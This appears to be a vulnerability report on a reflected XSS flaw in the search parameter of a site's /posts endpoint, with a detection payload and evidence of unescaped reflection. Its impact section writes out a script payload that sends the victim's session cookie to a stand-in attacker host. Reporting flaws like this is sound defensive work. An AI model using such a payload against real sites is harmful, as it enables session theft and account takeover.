## Vulnerability Class
Reflected Cross-Site Scripting (XSS)

## Endpoint
`GET /posts?search=`

## Vulnerable Parameter
`search` (query string parameter)

## Detection Payload
`<script>alert(1)</script>`

## Evidence
The payload is reflected unescaped in the HTML response body:
```
<h6>0 matches for <script>alert(1)</script></h6>
```
The `<script>` tags are rendered as literal HTML, not HTML-encoded. Any JavaScript within the tag would execute in the victim's browser.

## Impact
An attacker could craft a malicious URL such as:
```
http://www.hackergram.com/posts?search=<script>document.location='http://attacker.example/?c='+document.cookie</script>
```
and trick a victim into clicking it, stealing their session cookie or performing actions on their behalf.

## Notes
- No Content Security Policy header is set (CSP would mitigate this).
- Same pattern as `/users?search=` XSS vulnerability.